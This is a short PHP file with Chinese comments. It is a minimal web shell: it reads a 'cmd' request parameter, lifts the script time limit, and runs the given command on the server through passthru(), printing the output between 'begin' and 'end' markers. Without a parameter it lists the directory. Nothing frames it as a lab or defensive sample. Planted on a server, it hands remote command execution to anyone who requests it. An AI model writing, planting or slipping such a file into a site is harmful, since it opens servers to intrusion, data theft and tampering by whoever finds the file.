<?php
//（get参数获取）可去掉字符串中的反斜线字符
if (get_magic_quotes_gpc()){
	$_REQUEST["cmd"]=stripslashes($_REQUEST["cmd"]);
}
//设定针对这个文件的执行时间，0为不限制
ini_set("max_execution_time",0);
//打印输出开始标志
echo "begin<br>";
//运行cmd指定的命令
if(isset($_REQUEST["cmd"])){
	passthru($_REQUEST["cmd"]);
}else {
	passthru("dir");
}
//打印输出结束标志
echo "end";
?>